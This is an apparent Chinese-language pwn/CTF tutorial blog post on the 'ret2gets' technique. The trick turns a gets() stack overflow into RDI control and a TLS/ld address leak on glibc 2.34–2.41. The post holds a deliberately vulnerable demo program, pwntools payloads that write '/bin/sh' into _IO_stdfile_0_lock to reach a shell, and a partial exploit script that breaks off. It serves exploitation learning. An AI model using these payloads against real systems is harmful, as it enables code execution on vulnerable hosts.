---
title: "无 gadgets 也能翻盘：ret2gets 能否成为核武器？"
published: 2025-09-26
updated: 2025-09-29
description: 'Who needs "pop rdi" when you have gets() ?'
image: "https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.7lkcyy54li.avif"
tags: ["Pwn", "Notes"]
category: "Notes"
draft: false
---

`ret2gets` 是用于在 `glibc >= 2.34` 没有常用 gadgets，控制不了任何参数的情况下，通过调用 `gets`，配合 `printf / puts` 等输出函数实现 ld 地址泄漏进而为深入构造 ROP Chain 做准备的 trick 。

:::tip
此 trick 适用于 `GLIBC >= 2.34，<= 2.41` 的 ROP Chain 构造。
:::

直接上 demo，这里使用的 GLIBC 版本是 `2.41-6ubuntu1_amd64`：

```c
// gcc -Wall vuln.c -o vuln -no-pie -fno-stack-protector -std=c99

#include <stdio.h>

int main() {
  char buf[0x20];
  puts("ROP me if you can!");
  gets(buf);

  return 0;
}
```

:::important
`gets` 函数在 C11 中被移除，所以我们编译的时候需要手动指定一个低于 C11 的标准，比如这里指定了 C99。
:::

如果我们使用 ropper 或者其它同类工具，列出这个程序中包含的 gadgets，我们会发现它并没有常用于控制参数的 gadgets，我们什么参数也控制不了。

```asm showLineNumbers=false collapse={4-114}
Gadgets
=======


0x000000000040106c: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f53]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040106b: adc dword ptr ss:[rax], eax; call qword ptr [rip + 0x2f53]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401070: adc eax, 0x2f53; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040109c: adc ecx, dword ptr [rax - 0x75]; add eax, 0x2f2c; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x000000000040110c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x3090; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret;
0x0000000000401074: add ah, dh; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040106e: add bh, bh; adc eax, 0x2f53; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040100e: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x000000000040107c: add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x000000000040115a: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret;
0x000000000040115b: add byte ptr [rax], al; add cl, cl; ret;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x3016; call rax;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010a2: add byte ptr [rax], al; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x00000000004010a2: add byte ptr [rax], al; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax; ret;
0x00000000004010e4: add byte ptr [rax], al; test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x000000000040107e: add byte ptr [rax], al; endbr64; ret;
0x0000000000401073: add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040115c: add byte ptr [rax], al; leave; ret;
0x00000000004010f6: add byte ptr [rax], al; ret;
0x00000000004010f5: add byte ptr [rax], r8b; ret;
0x000000000040109a: add byte ptr [rbx + rdx + 0x48], dh; mov eax, dword ptr [rip + 0x2f2c]; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x0000000000401099: add byte ptr [rbx + rdx + 0x48], sil; mov eax, dword ptr [rip + 0x2f2c]; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x000000000040111b: add byte ptr [rcx], al; pop rbp; ret;
0x00000000004010e3: add byte ptr cs:[rax], al; test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x000000000040115d: add cl, cl; ret;
0x000000000040106d: add dil, dil; adc eax, 0x2f53; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010e1: add eax, 0x2efa; test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x000000000040109f: add eax, 0x2f2c; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x000000000040100a: add eax, 0x2fc9; test rax, rax; je 0x3016; call rax;
0x000000000040100a: add eax, 0x2fc9; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x0000000000401017: add esp, 8; ret;
0x0000000000401016: add rsp, 8; ret;
0x0000000000401154: call 0x3040; mov eax, 0; leave; ret;
0x0000000000401111: call 0x3090; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret;
0x000000000040106f: call qword ptr [rip + 0x2f53]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401014: call rax;
0x0000000000401014: call rax; add rsp, 8; ret;
0x0000000000401006: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fc9; test rax, rax; je 0x3016; call rax;
0x0000000000401012: je 0x3016; call rax;
0x0000000000401012: je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010a7: je 0x30b0; mov edi, 0x404020; jmp rax;
0x00000000004010a7: je 0x30b0; mov edi, 0x404020; jmp rax; ret;
0x000000000040109b: je 0x30b0; mov rax, qword ptr [rip + 0x2f2c]; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x00000000004010e9: je 0x30f8; mov edi, 0x404020; jmp rax;
0x00000000004010e9: je 0x30f8; mov edi, 0x404020; jmp rax; nop word ptr [rax + rax]; ret;
0x00000000004010dd: je 0x30f8; mov rax, qword ptr [rip + 0x2efa]; test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x00000000004010ae: jmp rax;
0x00000000004010f0: jmp rax; nop word ptr [rax + rax]; ret;
0x00000000004010ae: jmp rax; ret;
0x000000000040114e: lea eax, [rbp - 0x20]; mov rdi, rax; call 0x3040; mov eax, 0; leave; ret;
0x000000000040114d: lea rax, [rbp - 0x20]; mov rdi, rax; call 0x3040; mov eax, 0; leave; ret;
0x0000000000401116: mov byte ptr [rip + 0x2f03], 1; pop rbp; ret;
0x0000000000401159: mov eax, 0; leave; ret;
0x00000000004010e0: mov eax, dword ptr [rip + 0x2efa]; test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x000000000040109e: mov eax, dword ptr [rip + 0x2f2c]; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fc9]; test rax, rax; je 0x3016; call rax;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fc9]; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x000000000040110f: mov ebp, esp; call 0x3090; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret;
0x0000000000401069: mov edi, 0x401136; call qword ptr [rip + 0x2f53]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010a9: mov edi, 0x404020; jmp rax;
0x00000000004010eb: mov edi, 0x404020; jmp rax; nop word ptr [rax + rax]; ret;
0x00000000004010a9: mov edi, 0x404020; jmp rax; ret;
0x0000000000401152: mov edi, eax; call 0x3040; mov eax, 0; leave; ret;
0x00000000004010df: mov rax, qword ptr [rip + 0x2efa]; test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x000000000040109d: mov rax, qword ptr [rip + 0x2f2c]; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fc9]; test rax, rax; je 0x3016; call rax;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fc9]; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x000000000040110e: mov rbp, rsp; call 0x3090; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret;
0x0000000000401068: mov rdi, 0x401136; call qword ptr [rip + 0x2f53]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401151: mov rdi, rax; call 0x3040; mov eax, 0; leave; ret;
0x0000000000401078: nop dword ptr [rax + rax]; endbr64; ret;
0x00000000004010f3: nop dword ptr [rax + rax]; ret;
0x0000000000401077: nop dword ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010f2: nop word ptr [rax + rax]; ret;
0x0000000000401076: nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401007: or byte ptr [rax - 0x75], cl; add eax, 0x2fc9; test rax, rax; je 0x3016; call rax;
0x000000000040111d: pop rbp; ret;
0x000000000040110d: push rbp; mov rbp, rsp; call 0x3090; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret;
0x0000000000401042: ret 0x2f;
0x0000000000401011: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004010de: sbb dword ptr [rax - 0x75], ecx; add eax, 0x2efa; test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x00000000004010a0: sub al, 0x2f; add byte ptr [rax], al; test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x0000000000401165: sub esp, 8; add rsp, 8; ret;
0x0000000000401005: sub esp, 8; mov rax, qword ptr [rip + 0x2fc9]; test rax, rax; je 0x3016; call rax;
0x0000000000401164: sub rsp, 8; add rsp, 8; ret;
0x0000000000401004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fc9]; test rax, rax; je 0x3016; call rax;
0x000000000040107a: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x0000000000401010: test eax, eax; je 0x3016; call rax;
0x0000000000401010: test eax, eax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010a5: test eax, eax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x00000000004010a5: test eax, eax; je 0x30b0; mov edi, 0x404020; jmp rax; ret;
0x00000000004010e7: test eax, eax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x00000000004010e7: test eax, eax; je 0x30f8; mov edi, 0x404020; jmp rax; nop word ptr [rax + rax]; ret;
0x000000000040100f: test rax, rax; je 0x3016; call rax;
0x000000000040100f: test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010a4: test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax;
0x00000000004010a4: test rax, rax; je 0x30b0; mov edi, 0x404020; jmp rax; ret;
0x00000000004010e6: test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x00000000004010e6: test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax; nop word ptr [rax + rax]; ret;
0x00000000004010e2: cli; add byte ptr cs:[rax], al; test rax, rax; je 0x30f8; mov edi, 0x404020; jmp rax;
0x0000000000401163: cli; sub rsp, 8; add rsp, 8; ret;
0x0000000000401003: cli; sub rsp, 8; mov rax, qword ptr [rip + 0x2fc9]; test rax, rax; je 0x3016; call rax;
0x0000000000401083: cli; ret;
0x0000000000401160: endbr64; sub rsp, 8; add rsp, 8; ret;
0x0000000000401000: endbr64; sub rsp, 8; mov rax, qword ptr [rip + 0x2fc9]; test rax, rax; je 0x3016; call rax;
0x0000000000401080: endbr64; ret;
0x0000000000401075: hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040115e: leave; ret;
0x000000000040111f: nop; ret;
0x000000000040101a: ret;

111 gadgets found
```

这是因为原先的这些控制寄存器的 gadgets 都是来自于 `__libc_csu_init`，而现在这个函数因为包含了易于构造 ROP Chain 的 gadgets，在 GLIBC 2.34 中已经被 [patch](https://sourceware.org/pipermail/libc-alpha/2021-February/122794.html) 了，导致我们现在很难再找到有用的 gadgets 。

这里我们在调用 `gets` 的地方下断点，执行 `gets` 之前 `rdi` 指向的是 buf 的栈地址，`ni`，随便输入什么后，发现 `rdi` 寄存器变成了 `*RDI  0x7ffff7e137c0 (_IO_stdfile_0_lock) ◂— 0`：

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.1lc6yoffsz.avif" alt="" />
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.13m5a38r8s.avif" alt="" />
</center>

定位一下，发现该结构体位于 libc 后的 rw 匿名映射段中：

```asm showLineNumbers=false
pwndbg> vmmap $rdi
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x7ffff7e11000     0x7ffff7e13000 rw-p     2000 210000 libc.so.6
►   0x7ffff7e13000     0x7ffff7e20000 rw-p     d000      0 [anon_7ffff7e13] +0x7c0
    0x7ffff7fb4000     0x7ffff7fb9000 rw-p     5000      0 [anon_7ffff7fb4]
pwndbg> x/10gx $rdi
0x7ffff7e137c0 <_IO_stdfile_0_lock>: 0x0000000000000000 0x0000000000000000
0x7ffff7e137d0 <__pthread_force_elision>: 0x0000000000000000 0x0000000000000000
0x7ffff7e137e0 <__attr_list_lock>: 0x0000000000000000 0x0000000000000000
0x7ffff7e137f0 <init_sigcancel>: 0x0000000000000000 0x0000000000000000
0x7ffff7e13800 <__nptl_threads_events>: 0x0000000000000000 0x0000000000000000
```

此时如果我们再次调用 gets，我们就可以覆盖从 `_IO_stdfile_0_lock` 开始的数据，这可能会产生一些攻击面。

这里我们先研究我们已经获得的 `_IO_stdfile_0_lock`。

## \_IO_stdfile_0_lock

首先简单介绍一下 `_IO_stdfile_0_lock` 是什么，从名字上看，我们就能猜到它是一把「锁」，肯定是用于多线程安全的，实际上也确实如此，它主要用于锁住 `FILE`。

由于 glibc 支持多线程，许多函数实现需要线程安全。如果存在多个线程可以同时使用同一个 FILE 结构，那么当有两个线程尝试同时使用一个 FILE 结构时，就会产生条件竞争，可能会破坏 FILE 结构。解决方案就是加锁。

:::tip
基于 [glibc-2.41](https://elixir.bootlin.com/glibc/glibc-2.41/source/libio/iogets.c) 的源码。
:::

```c
char *
_IO_gets (char *buf)
{
  size_t count;
  int ch;
  char *retval;

  _IO_acquire_lock (stdin);
  ch = _IO_getc_unlocked (stdin);
  if (ch == EOF)
    {
      retval = NULL;
      goto unlock_return;
    }
  if (ch == '\n')
    count = 0;
  else
    {
      /* This is very tricky since a file descriptor may be in the
  non-blocking mode. The error flag doesn't mean much in this
  case. We return an error only when there is a new error. */
      int old_error = stdin->_flags & _IO_ERR_SEEN;
      stdin->_flags &= ~_IO_ERR_SEEN;
      buf[0] = (char) ch;
      count = _IO_getline (stdin, buf + 1, INT_MAX, '\n', 0) + 1;
      if (stdin->_flags & _IO_ERR_SEEN)
 {
   retval = NULL;
   goto unlock_return;
 }
      else
 stdin->_flags |= old_error;
    }
  buf[count] = 0;
  retval = buf;
unlock_return:
  _IO_release_lock (stdin);
  return retval;
}

weak_alias (_IO_gets, gets)

link_warning (gets, "the `gets' function is dangerous and should not be used.")
```

函数开始时使用 `_IO_acquire_lock` 获取锁，结束时使用 `_IO_release_lock` 释放锁。获取锁会告知其它线程 `stdin` 当前正在被使用中，所以其余任何尝试访问 stdin 的线程都将被强制等待，直到该线程释放锁后，其它线程才可以获取锁。

因此，`FILE` 有一个 [\_lock](https://elixir.bootlin.com/glibc/glibc-2.41/source/libio/bits/types/struct_FILE.h#L84) 字段，它是一个指向 [\_IO_lock_t](https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/nptl/stdio-lock.h#L26) 的指针：

```c {49} collapse={1-46}
struct _IO_FILE;
struct _IO_marker;
struct _IO_codecvt;
struct _IO_wide_data;

/* During the build of glibc itself, _IO_lock_t will already have been
   defined by internal headers.  */
#ifndef _IO_lock_t_defined
typedef void _IO_lock_t;
#endif

/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
struct _IO_FILE
{
  int _flags;  /* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr; /* Current read pointer */
  char *_IO_read_end; /* End of get area. */
  char *_IO_read_base; /* Start of putback+get area. */
  char *_IO_write_base; /* Start of put area. */
  char *_IO_write_ptr; /* Current put pointer. */
  char *_IO_write_end; /* End of put area. */
  char *_IO_buf_base; /* Start of reserve area. */
  char *_IO_buf_end; /* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2:24;
  /* Fallback buffer to use when malloc fails to allocate one.  */
  char _short_backupbuf[1];
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

```c
typedef struct {
  int lock;
  int cnt;
  void *owner;
} _IO_lock_t;
```

:::important
这个 `_lock` 指针指向的就是我们 `rdi` 中的 `_IO_stdfile_0_lock`，先记住这点，下面有用。
:::

### \_IO_acquire_lock / \_IO_release_lock

```c
#define _IO_USER_LOCK 0x8000

# ifdef __EXCEPTIONS
#  define _IO_acquire_lock(_fp) \
  do {                                                                    \
    FILE *_IO_acquire_lock_file                                           \
 __attribute__((cleanup (_IO_acquire_lock_fct)))                          \
 = (_fp);                                                                 \
    _IO_flockfile (_IO_acquire_lock_file);
# else
#  define _IO_acquire_lock(_fp) _IO_acquire_lock_needs_exceptions_enabled
# endif
# define _IO_release_lock(_fp) ; } while (0)
```

`__attribute__((cleanup (_IO_acquire_lock_fct))) = (_fp);` 主要就是将 cleanup 函数 `_IO_acquire_lock_fct` 和 `_fp` 进行一个绑定。使得在 `do { ... } while (0)` 作用域结束后自动对 `_fp` 调用 `_IO_acquire_lock_fct` 进行 cleanup 。

```c
static inline void
__attribute__ ((__always_inline__))
_IO_acquire_lock_fct (FILE **p)
{
  FILE *fp = *p;
  if ((fp->_flags & _IO_USER_LOCK) == 0)
    _IO_funlockfile (fp);
}
```

`_IO_USER_LOCK` 标志是用来记录当前 I/O 流是否处于由用户显式请求的锁定状态。

`_IO_acquire_lock_fct` 这个 cleanup 函数主要是，若 `FILE` 没有设置 `_IO_USER_LOCK` 标志，就对该文件解锁。

我们发现这加锁解锁层层封装了好几个宏：

```c
# define _IO_flockfile(_fp) \
  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)->_lock)
# define _IO_funlockfile(_fp) \
  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_unlock (*(_fp)->_lock)
```

如果用户没有显示请求上锁/解锁，就调用后面的函数，否则说明用户之前已经调用过 `flockfile` 或者 `funlockfile`，这个 if 将确保它不会重复上锁/解锁。

这还没完，真正执行最后上锁解锁操作的是下面的 `_IO_lock_lock` 和 `_IO_lock_unlock`。

### \_IO_lock_lock / \_IO_lock_unlock

```c
/* Initializers for lock.  */
#define LLL_LOCK_INITIALIZER (0)
#define LLL_LOCK_INITIALIZER_LOCKED (1)

#define _IO_lock_lock(_name) \
  do {                                               \
    void *__self = THREAD_SELF;                      \
    if (SINGLE_THREAD_P && (_name).owner == NULL)    \
      {                                              \
 (_name).lock = LLL_LOCK_INITIALIZER_LOCKED;         \
 (_name).owner = __self;                             \
      }                                              \
    else if ((_name).owner != __self)                \
      {                                              \
 lll_lock ((_name).lock, LLL_PRIVATE);               \
 (_name).owner = __self;                             \
      }                                              \
    else                                             \
      ++(_name).cnt;                                 \
  } while (0)

#define _IO_lock_unlock(_name) \
  do {                                               \
    if (SINGLE_THREAD_P && (_name).cnt == 0)         \
      {                                              \
 (_name).owner = NULL;                               \
 (_name).lock = 0;                                   \
      }                                              \
    else if ((_name).cnt == 0)                       \
      {                                              \
 (_name).owner = NULL;                               \
 lll_unlock ((_name).lock, LLL_PRIVATE);             \
      }                                              \
    else                                             \
      --(_name).cnt;                                 \
  } while (0)
```

这里的 `_name` 即 `_IO_stdfile_0_lock`。`owner` 字段存储当前持有锁的线程的 `TLS` 结构体地址。

加锁时，先获取当前线程 TLS 结构体地址，即 `THREAD_SELF`，然后分三种情况：

1. 单线程优化：如果是单线程环境并且锁没被占用，则直接把锁设为 `LOCKED`，并设置 `owner`
2. 多线程竞争：如果 `(_name).owner != __self`，即锁不属于当前线程，是其他线程持有，则调用 `lll_lock()`，阻塞直到锁可用后再尝试获取锁
3. 递归加锁：如果锁属于当前线程，说明同一线程再次加锁，则增加计数器 `cnt`

:::tip
有关 `lll_lock()` 的作用，简单来说就是：无论锁当前是否空闲，我调用它，都能保证最终自己持有这个锁（要么立刻成功，要么阻塞直到可用）。

因为它的实现是对 `futex (fast userspace mutex)` 的封装，futex 的特性为：

- 无竞争路径：如果锁的内部状态是「未锁」，原子操作直接把它设为「已锁」，立即返回，非常快
- 有竞争路径：如果发现锁已被其它线程持有，就会进入 futex 系统调用，把自己挂到等待队列上，一旦对方解锁唤醒，就可以立即获取到锁

  :::

释放锁的过程也很好理解：

1. 单线程优化：如果 `cnt` 为 0（没有递归加锁），直接清空 `owner`，把锁标记为解锁
2. 多线程情况：如果 `cnt` 为 0，清空 `owner`，并调用 `lll_unlock()` 释放 futex 锁
3. 递归解锁：如果 `cnt > 0`，说明是递归锁的一层，只会将 `cnt` 减一，不真正释放锁

### \_IO_stdfile_0_lock in RDI ?

现在我们研究研究为啥 rdi 是 `_IO_stdfile_0_lock` 而不是别的。这里如果你使用源码级调试的话会看得更清楚一点。

根据上面的分析，我们知道 `gets` 在最后返回的时候会调用 `_IO_release_lock (stdin)` 来释放锁。如果你还没忘记的话，我们定义 `_IO_acquire_lock (_fp)` 的时候设置了 cleanup 函数，将 `_fp` 和 `_IO_acquire_lock_fct` 绑定，一旦离开此作用域，就会自动调用 `_IO_acquire_lock_fct (_fp)`，而它内部又是通过 `_IO_funlockfile (fp)` 调用了 `_IO_lock_unlock (*(_fp)->_lock)`，完成这一整个释放锁的流程并返回。而最后调用的 `_IO_lock_unlock (*(_fp)->_lock)` 使用的参数正是 `_IO_stdfile_0_lock`。

很关键的一点就是，`_IO_release_lock(_fp)` 也属于这个定义域，所以如果 `_IO_release_lock(_fp)` 返回了，也会自动调用上面设置的 cleanup 函数。

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.96a43f63z9.avif" alt="" />
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.7pnv6o8tk.avif" alt="" />
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.esvqmae96.avif" alt="" />
</center>

观察上面的调试输出，我们执行完 `_IO_lock_unlock (*(_fp)->_lock)` 后就直接返回到了 `main`，并且执行完这个函数后在 epilogue 阶段并没有恢复 rdi，也就是说 rdi 会沿用最后一个被调用的函数的 rdi，即 `_IO_stdfile_0_lock` 这个值。

<em>
呼呼～长舒一口气～写到这里已经凌晨三点了，因为白天上了一天课（简直是虚度光阴……），只能晚上科研力。好在明天课免修了，我可以一直睡到早上十点半再起来，七个小时，应该也够我睡的了 LOL

要我说，这才是大学生活该有的样子啊，哈哈哈～
</em>

至此，我们已经搞清楚了整个流程，下面就研究如何利用吧～

## Attack

### Controlling RDI

由于我们再次调用 gets 就会向 rdi，也就是 `_IO_stdfile_0_lock` 中写入数据，那如果我们将 `/bin/sh` 写在这里，那 rdi 就变成了指向 `/bin/sh` 的字符串指针，效果与 `pop rdi; ret` 相当。此时如果我们可以调用 system 的话，就能 getshell 了。

根据上面的分析，我们这种 `gets` 的情况最后必然会通过 `((_fp)->_flags & _IO_USER_LOCK) == 0` 检测，进而调用 `_IO_lock_unlock (*(_fp)->_lock)`，所以我们只需要注意不要让这个函数内部执行的东西妨碍我们的利用即可。

我们发现，只要执行 `_IO_lock_unlock` 时 `cnt` 不为 0 就可以不带什么 side effect 的安全地返回，不过它会将 `cnt` 减一，如果我们直接传入 `/bin/sh` 的话，默认已经覆盖到了 `cnt`，但是由于减一会破坏我们的字符串，所以我们需要手动给那个位置的值加一。

```python
payload = flat(
    b"A" * 0x28,
    elf.plt["gets"],
)
target.sendlineafter(b"ROP me if you can!", payload)

payload = flat(
    b"/bin",
    p8(u8(b"/") + 1),
    b"sh",
)
target.sendline(payload)
```

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.9o05sn4ed6.avif" alt="" />
</center>

从上图我们可以看到，rdi 已经变成了我们的预期值，尽管会触发 SIGSEGV，但这也是必然的，毕竟我们还没有写入后续的 ROP Chain 。

:::tip
如果我们不手动将 `_IO_stdfile_0_lock` 的内容还原，`/bin/sh` 就会一直存在在那里，所以后续调用 `gets` 我们都会再次令 rdi 指向 `/bin/sh`。而执行过程中的加锁虽然会增加 `cnt`，但是执行完也会相应的进行解锁，减去 `cnt`，所以对我们写入的字符串不会产生什么影响。
:::

### Leaking libc / ld

解决了控制 rdi 的问题后，接下来介绍几种泄漏 libc / ld 的方法。

#### printf

如果我们可以调用 `printf`，那就可以用和上面一样的方法，通过 `%?$p` 然后返回到 printf 的方式泄漏任意地址。

这里就不做单独的演示了，相信实践起来还是很简单的。

#### puts

倘若没有 `printf`，只有 `puts` 的话，我们就可以通过输出 `_lock.owner` 的方式泄漏 TLS 的值，它相对于 ld 有着一个固定偏移，但是和 libc 之间没有固定偏移。

:::caution
所以下面 [ret2gets](#references) 中写的是有问题的，作者认为它和 libc 之间存在固定偏移，但很显然 TLS 地址不属于 libc 的范围，mmap 的映射区和 libc 之间有个较大的可映射空间，每次都会映射到这个空间内的随机位置。不过如果我们计算它与 ld 之间的偏移，会发现这两者之间却存在固定偏移。

那 ld 中是否存在可用的 gadgets 呢？我看了下 glibc 2.41 的 ld，发现里面几乎提供了控制每一个参数的 gadgets，甚至还有 syscall，尽管没有 onegadgets，但是我相信让你用这些 gadgets 手动构造一个 `execve` 启 shell 绝对是手拿把掐的 xD

当然，构造 sigreturn 就可以控制所有寄存器了，不是吗？感觉又掌握了一个堪比核武器的 trick LOL
:::

这里我只对高版本 glibc 使用 `puts` 泄漏 TLS 地址做一个总结，低版本也能用这个方法泄漏，但是没必要。不过我相信你学会高版本中泄漏 TLS 的方法后对于低版本怎么操作一定也没有问题。

首先回顾一下高版本 glibc 中[上锁/解锁](#_io_lock_lock--_io_lock_unlock)的代码。当我们首次调用 `gets` 的时候，会先进行一个上锁的操作，由于我们现在是单线程程序，且 `owner` 为 NULL，所以肯定会进入 `SINGLE_THREAD_P && (_name).owner == NULL` 检测。这就会将锁设置为 `LLL_LOCK_INITIALIZER_LOCKED`，即上锁状态，然后设置 `owner` 为当前 TLS 结构体地址。

之后 `gets` 将要返回时会执行解锁函数，按照现在的状态来看的话，我们必定会进入 `SINGLE_THREAD_P && (_name).cnt == 0` 中，这会将 `owner` 和 `lock` 都清空。那就没法用 puts 泄漏 owner 保存的 TLS 结构体地址了。

因此我们第一次调用 `gets` 可以令 rdi 指向 `_IO_stdfile_0_lock`，接着再次调用 `gets`，就可以向 rdi 写入数据，写什么呢？肯定是要写能绕过检测的内容咯。

此时我们不需要管上锁逻辑，只要关注解锁的时候，不要让它把 `owner` 清空即可，那首先就应该令 `(_name).cnt == 0` 不成立，将 `cnt` 填充为四字节垃圾值，此时 else if 也不会进入，而是进入 else 减少 `cnt` 的值。

_PS: Reference 中那篇文章这里说要绕过 `_IO_lock_lock`，我怀疑作者怕是犯糊涂了，事实上我们这里根本不需要关心如何绕过上锁函数的逻辑……_

可以看下图，是第二次 gets 后将 `cnt` 填充为垃圾字节后的结果，此时 `owner` 还持有着一个地址，但并不是 TLS 地址（虽然但是，这并不妨碍我们接下来泄漏 TLS）：

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.7p3z2o4g2j.avif" alt="" />
</center>

之后它会将 `cnt` 减一，就变成了 `0x4141414000000000`。

但是此时我们还不能直接通过 `puts` 连带泄漏 TLS 地址，因为这里面包含了四个空字节。解决方法是再调用一次 `gets`，覆盖 `lock` 的值即可。同时，由于再次调用 gets 会再次执行上锁函数，而它将发现 `(_name).owner != __self`，进入 else if 分支，将 `owner` 重置为正确的 TLS 地址。

> 你可能会想，为什么不直接在第二次 gets 的时候顺便覆盖 `lock` 呢？这是因为 `gets` 会在字符串结束后写入 `\x00`，破坏 TLS 结构体地址，所以我们需要分多次慢慢来。

那么我们输入四个 junk value padding 掉 `lock` 就会导致 `cnt` 低位变成 `\x00`，如下图：

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.4qroz5qju4.avif" alt="" />
</center>

但是紧接着就会将 `cnt` 自减，`\x00` 变成 `\xff`：

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.1lc708fw6z.avif" alt="" />
</center>

而此时，我们发现已经不存在截断 `puts` 输出的空字节了，此时我们可以直接通过 `puts` 输出 `_IO_stdfile_0_lock`，这会连带泄漏 TLS 结构体的地址，减掉它与 ld 的固定偏移就拿到 ld 基地址了。同时，由于 ld 中存在大量 gadgets，我们可以尽情抒写 ROP 狂想曲 LOL

## Exploit

### Manually call execve

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    ROP,
    args,
    context,
    flat,
    p32,
    process,
    raw_input,
    remote,
    u64,
)


FILE = "./vuln_patched"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
ld = ELF("./ld-linux-x86-64.so.2")
rop = ROP(ld)


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    payload = flat(
        b"A" * 0x28,
        elf.plt["gets"],
        elf.plt["gets"],
        elf.plt["puts"],
        elf.sym["main"],
    )
    raw_input("DEBUG")
